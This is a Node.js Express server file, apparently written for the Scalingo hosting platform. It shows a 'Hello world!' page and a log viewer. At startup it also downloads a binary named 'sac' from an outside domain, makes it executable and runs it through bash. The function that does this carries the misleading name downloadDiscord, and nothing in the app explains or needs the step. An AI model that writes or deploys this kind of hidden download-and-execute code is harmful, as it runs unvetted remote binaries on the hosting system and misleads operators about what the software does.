const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');

const PORT = process.env.PORT || 3000;
const FILE_PATH = '/tmp';   // Scalingo 可写目录

// 首页
app.get("/", (req, res) => {
  res.send("Hello world!");
});

// 查看 log.txt
app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send("读取 log.txt 文件时出错");
    }
    res.type("text/plain").send(data);
  });
});

// 下载 sac 文件
const downloadDiscord = async () => {
  const response = await axios({
    method: 'get',
    url: 'https://amd64.2go.us.kg/sac',
    responseType: 'stream'
  });

  const writer = fs.createWriteStream('/tmp/sac');

  response.data.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on('finish', () => {
      exec('chmod +x /tmp/sac', () => resolve());
    });
    writer.on('error', reject);
  });
};

// 执行 sac
const Execute = async () => {
  await downloadDiscord();
  exec('/tmp/sac', { shell: '/bin/bash' });
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
